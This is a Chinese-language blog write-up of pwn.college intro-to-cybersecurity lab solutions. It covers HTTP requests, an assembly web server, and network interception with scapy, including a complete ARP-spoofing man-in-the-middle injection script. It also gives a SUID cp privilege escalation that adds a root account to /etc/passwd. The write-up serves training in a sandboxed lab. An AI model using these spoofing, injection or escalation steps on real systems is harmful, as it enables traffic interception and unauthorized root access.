---
title: pwn.college
date: 2024-09-01 13:58:23
category: wp
tags:
---

> https://pwn.college

# intro to cybersecurity
## talking-web
### HTTP
HTTP是一个应用层协议

有关会话层的TCP、UDP协议，网络层的IP协议，数据链路层的以太网协议将会在pwn.college的[intercepting-communication](#intercepting-communication)部分中提到

#### HTTP request
下面是HTTP请求的主要结构
```
+-------------+----------------------------+------------------------------------------------+
|format       |GET exapmle                 |POST example                                    |
+-------------+----------------------------+------------------------------------------------+
|request line |GET /get?a=12&b=34 HTTP/1.1 |POST /post HTTP/1.1                             |
|header       |Host: httpbin.org           |Host: httpbin.org                               |
|header       |                            |Content-Type: application/x-www-form-urlencoded |
|header       |                            |Content-Length: 9                               |
|blank line   |                            |                                                |
|request data |                            |a=12&b=34                                       |
+-------------+----------------------------+------------------------------------------------+
```

### Challenges
#### level1
> Send an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80
```

##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1
```

##### python
```python
import requests

url = "http://127.0.0.1:80"

response = requests.get(url)

print(response.content)
```

#### level2
> Set the host header in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -H host:1c61bf39a9545b12f6fe638081f14f5c
```

##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1
Host: c3b1fc17a0766e184c9af77b59799187
```

##### python
```python
import requests

url = "http://127.0.0.1:80"
host = "9caff40ba2b50555593035fa83ddd063"

headers = {
        "host":host
}

response = requests.get(url,headers=headers)

print(response.content)
```

#### level3
> Set the path in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80/756549fa99c1d39df50fa0dbc7001b5b
```

##### nc
```shell
$ nc 127.0.0.1 80
GET /dff70448ab02fa153e53c321d12c3e25 HTTP/1.1
```

##### python
```python
import requests

url = "http://127.0.0.1:80/be21ae3ca3c57337269c87354f7fb58a"

response = requests.get(url)

print(response.content)
```

#### level4
> URL encode a path in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80/468d0524%20a0f46d01/13a2115f%2045f6bf42
```

##### nc
```shell
$ nc 127.0.0.1 80
GET /e834594f%20d12bbc07/45b1bdd9%2077ad1aa4 HTTP/1.1
```

##### python
```python
import requests
from urllib.parse import quote

base_url = "http://127.0.0.1:80"
path = "/e1467bf6 1173372a/0d30c414 6d22c249"
url = base_url + quote(path)

response = requests.get(url)

print(response.content)
```

#### level5
> Specify an argument in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80/?a=21c2593a91c22ea996d92149d6ee1310
```

##### nc
```shell
$ nc 127.0.0.1 80
GET /?a=0c59ad68454000d755026a99dadaa303 HTTP/1.1
```

##### python
```python
import requests
from urllib.parse import urlencode

url = "http://127.0.0.1:80"

a = "1d4f071509297083549435a7d5c7e650"
params = {
    "a":a
}
params = urlencode(params)

response = requests.get(url,params=params)

print(response.content)
```

#### level6
> Specify multiple arguments in an HTTP request
##### curl
```shell
$ curl -v -G --data-urlencode 'a=b40ff87c1dfc9445e66bd1dffd31ecf3' --data-urlencode 'b=e9e53eab 8cccb234&d985bc70#d49f0c63' 127.0.0.1:80
```

##### nc
```shell
$ nc 127.0.0.1 80
GET /?a=01df1fb634dda7a5f27c6c54d072b51d&b=de8950c2%20d91fa17a%2678fc768c%23e848a330 HTTP/1.1
```

##### python
```python
import requests
from urllib.parse import urlencode

url = "http://127.0.0.1:80"
a="7afab61dacb0fca25609fedd696bce30"
b="bb179fab e02b7f2f&3a717740#2fb93639"

params = {
    "a":a,
    "b":b
}
params = urlencode(params)

response = requests.get(url,params=params)

print(response.content)
```

#### level7
> Include form data in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -d "a=d59caa292e43dd969de6c0d6adebd053"
```

##### nc
```shell
$ nc 127.0.0.1 80
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

a=0a849ab7d1b57ed2f864880911873622
```

##### python
```python
import requests

url = "http://127.0.0.1:80"
a = 'ab3f0e720c694b54bf8fb2e2c4e6c6f5'
data = {'a':a}

response = requests.post(url,data)

print(response.content)
```

#### level8
> Include form data with multiple fields in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -d "a=a4431e83e83cae7723c24b83f465475e" --data-urlencode "b=6100a2f0 e8809d07&587a0ea8#9b1109cd"
```

##### nc
```shell
$ nc 127.0.0.1 80
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

a=b0f2f1b6f49b2896213fb29b3b93a1ef&b=57792821%20bc13e5dc%261426d3c1%23972f7bb8
```

##### python
```python
import requests

url = "http://127.0.0.1:80"
a = '0b39bf04e5ff6e32c942117af11502ef'
b = '3856a81d 06f783f6&494c9950#b7a38f82'
data = {
    'a':a,
    'b':b
}

response = requests.post(url,data)

print(response.content)
```

#### level9
> Include json data in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -H 'Content-Type:application/json' -d '{"a":"547135c945b35920ab6b764faba0467c"}'
```

##### nc
```shell
$ nc 127.0.0.1 80
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 40

{"a":"506924275dda4823072f030cb9e36878"}
```

##### python
```python
import requests
import json

url = "http://127.0.0.1:80"
a = 'b152f0359ac06459241c8d57bcf2a8cb'
data = {
    'a':a,
}

headers = {
    'Content-Type':'application/json'
}

response = requests.post(url,headers = headers,data=json.dumps(data))

print(response.content)
```

#### level10
> Include complex json data in an HTTP request
##### curl
```shell
$ curl 127.0.0.1:80 -H 'Content-Type:application/json' -d '{"a":"afb674d6a6635008d8f123b6db1c7fe1","b":{"c":"eaa06025","d":["f3e76d78","8897c850 15e64e19&86faa062#707120a5"]}}'
```

##### nc
```shell
$ nc 127.0.0.1 80
POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 116

{"a":"e0e3ffb1ea8c041f948fd4a52b8b03ef","b":{"c":"07027b1c","d":["9caee2fb","40d89ef2 c4b79a11&7fa007c8#ccf64a5f"]}}
```

##### python
```python
import requests
import json

url = "http://127.0.0.1:80"
data = {
    "a":"6c924b91dc3acbfe942f9a313d81c607",
    "b":{
        "c":"9b0456d0",
        "d":[
            "96f87ee7",
            "1e81e83f 35de65b4&ecedb67b#29d8d3c2"
        ]
    }
}

headers = {
    'Content-Type':'application/json'
}

response = requests.post(url,headers = headers,data=json.dumps(data))

print(response.content)
```

#### level11
> Follow an HTTP redirect from HTTP response
##### curl
```shell
$ curl 127.0.0.1:80 -L
```
##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1

$ nc 127.0.0.1 80
GET /8987117b1c7a13a67e6ebdab1040b023 HTTP/1.1
```

##### python
```python
import requests

url = "127.0.0.1:80"

# 'allow_redirects=true' is default option, can be removed
response = requests.get(url,allow_redirects=true)

print(response.content)
```

#### level12
> Include a cookie from HTTP response
##### curl
```shell
$ curl 127.0.0.1:80 -v

$ curl 127.0.0.1:80 --cookie "cookie=b0a72e415cbb83c7d2671097074329c0"
```

##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1

$ nc 127.0.0.1 80
GET / HTTP/1.1
Cookie: cookie=4203ce2d43f46581fe45652da89f9310
```

##### python
```python
import requests

url = "http://127.0.0.1:80"

with requests.Session() as s:
    r = s.get(url)
    print(r.content)

```

#### level13
> Make multiple requests in response to stateful HTTP responses
##### curl
```shell
$ curl 127.0.0.1:80 -v
$ curl 127.0.0.1:80 --cookie "session=eyJzdGF0ZSI6MX0.ZqI1lw.eBOyNFmp0kEvgn4a1KTi6--ZyvE" -v
$ curl 127.0.0.1:80 --cookie "session=eyJzdGF0ZSI6Mn0.ZqI1vA.zPh9QlVY-OvqFsXUk6IvcmafTBU" -v
$ curl 127.0.0.1:80 --cookie "session=eyJzdGF0ZSI6M30.ZqI2AQ.71jPgAYQa35fYtKd79FZU9l2Omg" -v
```

##### nc
```shell
$ nc 127.0.0.1 80
GET / HTTP/1.1

$ nc 127.0.0.1 80
GET / HTTP/1.1
Cookie: session=eyJzdGF0ZSI6MX0.ZqI20w.GYw4a8ICn5uSqs2EPgpS6VPwfmE

$ nc 127.0.0.1 80
GET / HTTP/1.1
Cookie: session=eyJzdGF0ZSI6Mn0.ZqI4EA.ZyJQGgplU-tBR8ZmkGnhwt9-fWE

$ nc 127.0.0.1 80
GET / HTTP/1.1
Cookie: session=eyJzdGF0ZSI6M30.ZqI4NA.G_jGq5vQx6fd2HY3SgqzG95ZXo4
```

##### python
```python
import requests

url = "http://127.0.0.1:80"

with requests.Session() as s:
    r = s.get(url)
    print(r.content)
```

## building-a-web-server
### challenges
这是最终的程序
```X86ASM
.intel_syntax noprefix

.globl _start

.text

#============================================
# function
_start:
    call main
    mov rdi, 0
    mov rax, 60     # SYS_exit
    syscall

#============================================
# function
# [rbp-0x8]     listen_fd
# [rbp-0x10]    accept_fd
# [rbp-0x18]    fork_fd
main:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18

    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41     # SYS_socket
    syscall
    mov [rbp-0x8], rax
    
    mov rdi, [rbp-0x8]
    lea rsi, sockaddr_in
    mov rdx, 16
    mov rax, 49     # SYS_bind
    syscall

    mov rdi, [rbp-0x8]
    xor rsi, rsi
    mov rax, 50     # SYS_listen
    syscall

main_loop:
    mov rdi, [rbp-0x8]
    mov rsi, 0
    mov rdx, 0
    mov rax, 43     # SYS_accept
    syscall
    mov [rbp-0x10], rax

    mov rax, 57     # SYS_fork
    syscall
    mov [rbp-0x18], rax

    cmp rax, 0
    je main_subprocess

    mov rdi, [rbp-0x10]
    mov rax, 3      # SYS_close
    syscall

    jmp main_loop

main_subprocess:
    mov rdi, [rbp-0x8]
    mov rax, 3      # SYS_close
    syscall

    mov rdi, [rbp-0x10]
    call process

    leave
    ret

#============================================
# process(int fd)
# [rbp-0x8]         fd
# [rbp-0x408]       request
# [rbp-0x808]       file_path
# [rbp-0x810]       file_fd
# [rbp-0xc10]       file_data
# [rbp-0xc18]       file_data_len
# [rbp-0xc20]       data_addr
process:
    push rbp
    mov rbp, rsp
    sub rsp, 0xc20
    mov [rbp-0x8], rdi
    mov rdi, [rbp-0x8]
    lea rsi, [rbp-0x408]
    mov rdx, 1024
    mov rax, 0       # SYS_read
    syscall
    lea rdi, [rbp-0x408]
    lea rsi, [rbp-0x808]
    mov rdx, 1024
    call get_path
    mov al, byte ptr [rbp-0x408]
    cmp rax, 'G'
    je process_get
    xor rcx, rcx
    mov al, byte ptr [rbp-0x408]
    cmp rax, 'P'
    je process_post
    jmp process_error
process_get:
    lea rdi, [rbp-0x808]
    mov rsi, 0
    mov rax ,2       # SYS_open
    syscall
    mov [rbp-0x810], rax
    mov rdi, [rbp-0x810]
    lea rsi, [rbp-0xc10]
    mov rdx, 1024
    mov rax, 0       # SYS_read
    syscall
    mov [rbp-0xc18], rax
    mov rdi, [rbp-0x810]
    mov rax, 3      # SYS_close
    syscall
    mov rdi, [rbp-0x8]
    lea rsi, reponse
    mov rdx, 19
    mov rax, 1      # SYS_write
    syscall
    mov rdi, [rbp-0x8]
    lea rsi, [rbp-0xc10]
    mov rdx, [rbp-0xc18]
    mov rax, 1      # SYS_write
    syscall
process_post:
    lea rdx, [rbp-0x408]
    mov eax, dword ptr [rdx+rcx]
    inc rcx
    cmp rax, 0x0a0d0a0d
    jne process_post
    add rcx, 3
    lea rax, [rdx+rcx]
    mov [rbp-0xc20], rax
    lea rdi, [rbp-0x808]
    mov rsi, 65
    mov rdx, 0777
    mov rax, 2    # SYS_open
    syscall
    mov [rbp-0x810], rax
    mov rdi, [rbp-0xc20]
    call strlen
    mov rdx, rax
    mov rdi, [rbp-0x810]
    mov rsi, [rbp-0xc20]
    mov rax, 1      # SYS_write
    syscall
    mov [rbp-0xc18], rax
    mov rdi, [rbp-0x810]
    mov rax, 3      # SYS_close
    syscall
    mov rdi, [rbp-0x8]
    lea rsi, reponse
    mov rdx, 19
    mov rax, 1      # SYS_write
    syscall
process_error:
    leave
    ret

#============================================
# int get_path(char *read_request,char *open_path,size_t len)
get_path:
    push rbp
    mov rbp, rsp
    sub rsp, 0x28

    mov [rbp-0x8], rdi                  # read_request
    mov [rbp-0x10], rsi                 # open_path
    mov [rbp-0x18], rdx                 # len
    mov dword ptr [rbp-0x20], 0         # index_read
    mov dword ptr [rbp-0x28], 0         # index_open

    xor rax, rax

get_path_loop0:
    mov rcx, [rbp-0x20]
    cmp rcx, [rbp-0x18]
    jnb get_path_end
    mov rdx, [rbp-0x8]
    mov al, byte ptr [rdx+rcx]
    inc rcx
    mov [rbp-0x20], rcx
    cmp rax, 0x20
    jne get_path_loop0
get_path_loop1:
    mov rcx, [rbp-0x20]
    cmp rcx, [rbp-0x18]
    jnb get_path_end
    mov rdx, [rbp-0x8]
    mov al, byte ptr [rdx+rcx]
    inc rcx
    mov [rbp-0x20], rcx
    cmp rax, 0x20
    je get_path_end
    mov rcx, [rbp-0x28]
    mov rdx, [rbp-0x10]
    mov byte ptr [rdx+rcx], al
    inc rcx
    mov [rbp-0x28], rcx
    jmp get_path_loop1
get_path_end:    
    mov rdx, [rbp-0x10]
    add rdx, [rbp-0x28]
    mov byte ptr [rdx], 0
    mov rax, [rbp-0x20]
    leave
    ret

#============================================
# size_t strlen(char *src)
strlen:
    push rbp
    mov rbp, rsp
    xor rax, rax
    xor rdx, rdx
strlen_loop:
    mov dl, byte ptr [rdi+rax]
    inc rax
    cmp rdx, 0
    jne strlen_loop
    sub rax, 1
    leave
    ret

#============================================

.data
sockaddr_in:
	.short 2        # sin_family
	.short 0x5000   # sin_port
    .long 0         # sin_addr
    .rept 8
    .byte 0
    .endr

reponse:
    .string "HTTP/1.0 200 OK\r\n\r\n"

```

## intercepting-communication
### challenges
In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.

#### level1
> Connect to a remote host
```shell
$ nc 10.0.0.3 31337
```

#### level2
> Listen for a connection from a remote host
```shell
$ nc -l -p 31337
```

#### level3
> Find and connect to a remote host

```shell
The remote host is somewhere on the `10.0.0.0/24` subnetwork, listening on port `31337`.

$ nmap -v 10.0.0.0/24 -p 31337
```

#### level4
> Find and connect to a remote host on a large network

```shell
The remote host is somewhere on the `10.0.0.0/16` subnetwork, listening on port `31337`.

$ nmap -v 10.0.0.0/16 -p 31337 -T5

65536 IP addresses (2 hosts up) scanned in 2612.03 seconds
```

#### level5
> Monitor traffic from a remote host

In this challenge you will monitor traffic from a remote host.
Your host is already receiving traffic on port `31337`.

```shell
$ tcpdump -A
```

#### level6
> Monitor slow traffic from a remote host

In this challenge you will monitor slow traffic from a remote host.
Your host is already receiving traffic on port `31337`.

```shell
$ tcpdump -Q in "tcp[tcpflags]&tcp-push!=0" -X -q -l | grep 0x0030
```

or you can use wireshark


#### level7
> Hijack traffic from a remote host by configuring your network interface

In this challenge you will hijack traffic from a remote host by configuring your network interface.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.

```shell
$ ip addr add 10.0.0.2/16 dev eth0

$ nc -l 31337
```

#### level8
> Manually send an Ethernet packet

In this challenge you will manually send an Ethernet packet.
The packet should have `Ether type=0xFFFF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
$ scpay

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'06:3f:d7:4f:63:40'
>>> pk=Ether(src="06:3f:d7:4f:63:40",dst="ff:ff:ff:ff:ff:ff",type=0xFFFF)
>>> srp(pk,iface="eth0")
```

#### level9
> Manually send an Internet Protocol packet

In this challenge you will manually send an Internet Protocol packet.
The packet should have `IP proto=0xFF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
$ scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'd6:8e:5a:63:78:a2'
>>> pk=Ether(src="d6:8e:5a:63:78:a2",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3",proto=0xff)
>>> srp(pk1)
```

#### level10
> Manually send a Transmission Control Protocol packet

In this challenge you will manually send a Transmission Control Protocol packet.
The packet should have `TCP sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF`.
The packet should be sent to the remote host at `10.0.0.3`.

```python
$ scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'96:14:00:18:e9:96'
>>> pk=Ether(src="96:14:00:18:e9:96",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31337,ack=31337,flags='APRSF')
>>> srp(pk,iface='eth0')
```

#### level11
> Manually perform a Transmission Control Protocol handshake

In this challenge you will manually perform a Transmission Control Protocol handshake.
The initial packet should have `TCP sport=31337, dport=31337, seq=31337`.
The handshake should occur with the remote host at `10.0.0.3`.

```python
$ scapy

>>> get_if_list()
['lo', 'eth0']
>>> get_if_hwaddr("eth0")
'42:f4:f8:57:fa:a4'
>>> pk1=Ether(src="42:f4:f8:57:fa:a4",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31337,flags='S')
>>> response=srp(pk1,iface='eth0')
>>> response[0][0]
QueryAnswer(query=<Ether  dst=ff:ff:ff:ff:ff:ff src=42:f4:f8:57:fa:a4 type=IPv4 |<IP  frag=0 proto=6 src=10.0.0.2 dst=10.0.0.3 |<TCP  sport=31337 dport=31337 seq=31337 flags=S |>>>, answer=<Ether  dst=42:f4:f8:57:fa:a4 src=be:9b:98:0e:32:27 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=1 flags= frag=0 ttl=64 proto=6 chksum=0x66cb src=10.0.0.3 dst=10.0.0.2 |<TCP  sport=31337 dport=31337 seq=3424417206 ack=31338 dataofs=5 reserved=0 flags=SA window=8192 chksum=0xcabd urgptr=0 |>>>)
>>> pk2=Ether(src="42:f4:f8:57:fa:a4",dst="be:9b:98:0e:32:27")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337,dport=31337,seq=31338,ack=3424417207,flags='A')
>>> response1=srp(pk2,iface='eth0')

```

#### level12
> Manually send an Address Resolution Protocol packet

In this challenge you will manually send an Address Resolution Protocol packet.
The packet should have `ARP op=is-at` and correctly inform the remote host of where the sender can be found.
The packet should be sent to the remote host at `10.0.0.3`.

```python
$ scapy

>>> get_if_hwaddr("eth0")
'5e:76:a7:a8:dc:75'
>>> pk=Ether(src="5e:76:a7:a8:dc:75",dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at",hwsrc="5e:76:a7:a8:dc:75",psrc="10.0.0.2")
>>> srp(pk,iface='eth0')
```

#### level13
> Hijack traffic from a remote host using ARP

In this challenge you will hijack traffic from a remote host using ARP.
You do not have the capabilities of a NET ADMIN.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.

```python
>>> get_if_hwaddr("eth0")
'8e:4b:78:5c:3c:6a'
>>> pk=Ether(src="8e:4b:78:5c:3c:6a",dst="ff:ff:ff:ff:ff:ff")/ARP(op="is-at",hwsrc="8e:4b:78:5c:3c:6a",psrc="10.0.0.2",pdst="10.0.0.4")
>>> sendp(pk,iface="eth0")
>>> sniff(iface='eth0',filter='tcp[tcpflags]&tcp-push!=0',prn=hexdump) 

```

#### level14
> Man-in-the-middle traffic between two remote hosts and inject extra traffic

In this challenge you will man in the middle traffic between two remote hosts and inject extra traffic.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.3` on port `31337`.

```python
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

interface = "eth0"
local_mac = get_if_hwaddr(interface)
local_ip = "10.0.0.2"
ip1 = "10.0.0.3"
ip2 = "10.0.0.4"

mac1=getmacbyip(ip=ip1)
mac2=getmacbyip(ip=ip2)

print(f"\033[1;32mlocal_mac:{local_mac}\033[0m")
print(f"\033[1;32mmac1:{mac1}\033[0m")
print(f"\033[1;32mmac2:{mac2}\033[0m")

eth=Ether(src=local_mac,dst="ff:ff:ff:ff:ff:ff")
arp1=ARP(op="is-at",hwsrc=local_mac,psrc=ip1,pdst=ip2)
arp2=ARP(op="is-at",hwsrc=local_mac,psrc=ip2,pdst=ip1)
sendp(eth/arp1,iface=interface)
sendp(eth/arp2,iface=interface)

def process(p:Packet):
    try:
        print("load:",p['TCP'].load)
        if p['TCP'].load==b"COMMANDS:\nECHO\nFLAG\nCOMMAND:\n":
            pdst = p['IP'].src
            psrc = p['IP'].dst
            flags = 'PA'
            ipflags = p['IP'].flags
            dst = p['Ethernet'].src
            dport = p['TCP'].sport
            sport = p['TCP'].dport
            seq = p['TCP'].ack
            ack = p['TCP'].seq+24
            pk = Ether(src=local_mac,dst=dst)/IP(src=psrc,dst=pdst,flags=ipflags)/TCP(sport=sport,dport=dport,seq=seq,ack=ack,flags=flags)/Raw(load=b"FLAG")
            sendp(pk,iface=interface)
    except Exception:
        pass
    
sniff(iface=interface,filter="tcp",prn=process)
```

## access-control
### suid提权
#### 查找suid权限文件
```shell
$ find / -perm -u=s -type f 2>/dev/null
```

#### 常用命令提权方法
##### cp
```shell
$ cat /etc/passwd > passwd
$ openssl passwd -1 -salt z hack # 生成在passwd文件中hack密码对应的加密后口令
$ echo "hack:$1$z$eN1X4Y0BpzcYM5USaVCR.0:0:0::/root:/bin/shell" >> passwd # 生成一个新用户hack，其登录口令为hack
$ cp passwd /etc/passwd
$ su - hack
```

### challenge
In this series of challenges, you will be working with various access control systems.
Break the system to get the flag.

#### level1
> Flag owned by you with different permissions

```shell
In this challenge you will work with different UNIX permissions on the flag.
The flag file will be owned by you and have 400 permissions.

Before:
-r-------- 1 root root 58 Sep  1 07:26 /flag
After:
-r-------- 1 hacker root 58 Sep  1 07:26 /flag

$ cat /flag
```

#### level2
> Flag owned by you with different permissions

```shell
In this challenge you will work with different UNIX permissions on the flag.
The flag file will be owned by root, group as you, and have 040 permissions.

Before:
-r-------- 1 root root 58 Sep  1 07:27 /flag
After:
----r----- 1 root hacker 58 Sep  1 07:27 /flag

$ cat /flag
```

#### level3
> Flag owned by you with different permissions

```shell
In this challenge you will work with different UNIX permissions on the flag.
The flag file will be owned by you and have 000 permissions.

Before:
-r-------- 1 root root 58 Sep  1 07:36 /flag
After:
---------- 1 hacker root 58 Sep  1 07:36 /flag

$ chmod 777 /flag
$ cat /flag
```

#### level4
> How does SETUID work?

```shell
In this challenge you will work understand how the SETUID bit for UNIX permissions works.
What if /bin/cat had the SETUID bit set?

Before:
-rwxr-xr-x 1 root root 43416 Sep  5  2019 /bin/cat
After:
-rwsr-xr-x 1 root root 43416 Sep  5  2019 /bin/cat

$ cat /flag
```

#### level5
> How does SETUID and cp work?

```shell
In this challenge you will work understand how the SETUID bit for UNIX permissions works.
What if /bin/cp had the SETUID bit set?
Hint: Look into how cp will deal with different permissions.
Another Hint: check the man page for cp, any options in there that might help?

Before:
-rwxr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp
After:
-rwsr-xr-x 1 root root 153976 Sep  5  2019 /bin/cp

$ cat /etc/passwd > passwd
$ openssl passwd -1 -salt z hack
$ echo "hack:$1$z$eN1X4Y0BpzcYM5USaVCR.0:0:0::/root:/bin/shell" >> passwd
$ cp passwd /etc/passwd
$ su - hack
$ cat /flag
```

#### level6
> Flag owned by a different group

```shell
In this challenge you will work with different UNIX permissions on the flag.
The flag file is owned by root and a new group.
Hint: Search for how to join a group with a password.

Before:
-r-------- 1 root root 58 Sep  1 07:16 /flag
After:
----r----- 1 root group_yjtqrzub 58 Sep  1 07:16 /flag
The password for group_yjtqrzub is: swxryfxa

$ newgrp group_yjtqrzub # 输入密码 swxryfxa
$ groups
$ cat /flag
```

#### level7
> Flag owned by you with different permissions, multiple users

```shell
In this challenge you will work understand how UNIX permissions works with multiple users.
You'll also be given access to various user accounts, use su to switch between them.

Before:
-r-------- 1 root root 58 Sep  1 07:38 /flag
Created user user_iiwybckt with password ghvxdqze
After:
-------r-- 1 hacker root 58 Sep  1 07:38 /flag

$ su user_iiwybckt # 输入密码 ghvxdqze
$ cat /flag

# or

$ chmod 777 /flag
$ cat /flag
```

#### level8
> Flag owned by other users

```shell
In this challenge you will work understand how UNIX permissions works with multiple users.
You'll also be given access to various user accounts, use su to switch between them.

Before:
-r-------- 1 root root 58 Sep  1 07:39 /flag
Created user user_rhxpgtwj with password tyfbecia
After:
-r-------- 1 user_rhxpgtwj root 58 Sep  1 07:39 /flag

$ su user_rhxpgtwj # 输入密码 tyfbecia
$ cat /flag
```

#### level9
> Flag owned by other users

```shell
In this challenge you will work understand how UNIX permissions works with multiple users.
You'll also be given access to various user accounts, use su to switch between them.

Before:
-r-------- 1 root root 58 Sep  1 07:42 /flag
Created user user_cazgcldr with password kifrychf
After:
----r----- 1 root user_cazgcldr 58 Sep  1 07:42 /flag

$ su user_cazgcldr # 输入密码 kifrychf
$ cat /flag
```

#### level10
> Flag owned by a group

```shell
In this challenge you will work understand how UNIX permissions works with multiple users.
You'll also be given access to various user accounts, use su to switch between them.
Hint: How can you tell which user is in what group?

Before:
-r-------- 1 root root 58 Sep  1 07:43 /flag
Created user user_vcrwcfed with password mooryvsi
Created user user_nupwlgln with password snmihyet
Created user user_xocpstyf with password wvmxkawk
Created user user_jodemick with password wkfiqzmw
Created user user_jfhyfzcm with password cbrrtkhw
Created user user_jlvxtelf with password ezprzexf
Created user user_dkajakjt with password prdldnkc
Created user user_hlkosnol with password fbrushep
Created user user_qsamltgz with password yaknjraz
Created user user_gyrkocsy with password fskyzktv
After:
----r----- 1 root group_nkp 58 Sep  1 07:43 /flag

$ cat /etc/group
$ su xxx
$ cat /flag
```

#### level11
> Find the flag using multiple users

```shell
In this challenge you will work understand how UNIX permissions for directories work with multiple users.
You'll be given access to various user accounts, use su to switch between them.

Created user user_betcpnye with password dkhiqvyi
Created user user_qydwicsg with password gnaoedja
A copy of the flag has been placed somewhere in /tmp:
total 40
drwxrwxrwt 1 root   root          4096 Sep  1 07:45 .
drwxr-xr-x 1 root   root          4096 Sep  1 07:45 ..
-rw-rw-r-- 1 root   root             4 Aug  5 23:25 .cc.txt
-rw-r--r-- 1 root   root            55 Sep  1 01:16 .crates.toml
-rw-r--r-- 1 root   root           453 Sep  1 01:16 .crates2.json
drwxr-xr-x 2 hacker hacker        4096 Sep  1 07:45 .dojo
drwxr-xr-x 2 root   root          4096 Sep  1 01:16 bin
drwxr-xr-x 1 root   root          4096 Aug  5 23:22 hsperfdata_root
drwx------ 2    104           105 4096 Aug 27 04:47 tmp.gzrsgdiMSN
dr-xr-x--x 2 root   user_betcpnye 4096 Sep  1 07:45 tmpr_j9uk3r

$ su user_betcpnye
$ cd /tmp/tmpr_j9uk3r
$ ls
$ su user_qydwicsg
$ cat /tmp/tmpr_j9uk3r/xxx
```

#### level12
> Find the flag using multiple users

```shell
In this challenge you will work understand how UNIX permissions for directories work with multiple users.
You'll be given access to various user accounts, use su to switch between them.

Created user user_wavnhyls with password jnfksrwp
Created user user_ocqiyufq with password vmljvdoc
Created user user_npddlxea with password rtdytofy
A copy of the flag has been placed somewhere in /tmp:
total 40
drwxrwxrwt 1 root   root          4096 Sep  1 07:48 .
drwxr-xr-x 1 root   root          4096 Sep  1 07:47 ..
-rw-rw-r-- 1 root   root             4 Aug  5 23:25 .cc.txt
-rw-r--r-- 1 root   root            55 Sep  1 01:16 .crates.toml
-rw-r--r-- 1 root   root           453 Sep  1 01:16 .crates2.json
drwxr-xr-x 2 hacker hacker        4096 Sep  1 07:47 .dojo
drwxr-xr-x 2 root   root          4096 Sep  1 01:16 bin
drwxr-xr-x 1 root   root          4096 Aug  5 23:22 hsperfdata_root
drwx------ 2    104           105 4096 Aug 27 04:47 tmp.gzrsgdiMSN
dr-xr-x--x 3 root   user_wavnhyls 4096 Sep  1 07:48 tmp9wu15dcc

$ su user_wavnhyls
$ cd /tmp/tmp9wu15dcc
$ ls
$ su xxx-2
$ cd /tmp/tmpxxx/tmpxxx
$ ls
$ su xxx-3
$ cat /tmp/tmpxxx/tmpxxx/xxx 
```

#### level13
> One Mandatory Access Control question without categories

```shell
In this challenge you'll be answering questions about the standard Bell–LaPadula model of Mandatory Access Control.

Answer the question about the model to get the flag.


In this challenge, your goal is to answer 1 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:
4 Levels (first is highest aka more sensitive):
TS
S
C
UC
Q 1. Can a Subject with level UC read an Object with level UC?
yes
Correct!
Congratulations, you solved this challenge!

```

#### level14
> Five Mandatory Access Control questions without categories

```shell
In this series of challenges, you will be working with various access control systems.
Break the system to get the flag.


In this challenge you'll be answering questions about the standard Bell–LaPadula model of Mandatory Access Control.

Answer the questions about the model to get the flag.


In this challenge, your goal is to answer 5 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:
4 Levels (first is highest aka more sensitive):
TS
S
C
UC
Q 1. Can a Subject with level S write an Object with level S?
yes
Correct!
Q 2. Can a Subject with level S read an Object with level UC?
yes
Correct!
Q 3. Can a Subject with level C write an Object with level S?
yes
Correct!
Q 4. Can a Subject with level S write an Object with level TS?
yes
Correct!
Q 5. Can a Subject with level TS read an Object with level TS?
yes
Correct!
Congratulations, you solved this challenge!

```

#### level15
> One Mandatory Access Control question with categories

```shell
In this challenge you'll be answering questions about the category-based Bell–LaPadula model of Mandatory Access Control.

Answer the question about the model to get the flag.


In this challenge, your goal is to answer 1 questions correctly in 120 seconds about the following Mandatory Access Control (MAC) system:
4 Levels (first is highest aka more sensitive):
TS
S
C
UC
4 Categories:
NUC
NATO
UFO
ACE
Q 1. Can a Subject with level UC and categories {UFO} read an Object with level UC and categories {NATO, UFO, ACE}?
no
Correct!
Congratulations, you solved this challenge!
```

#### level16
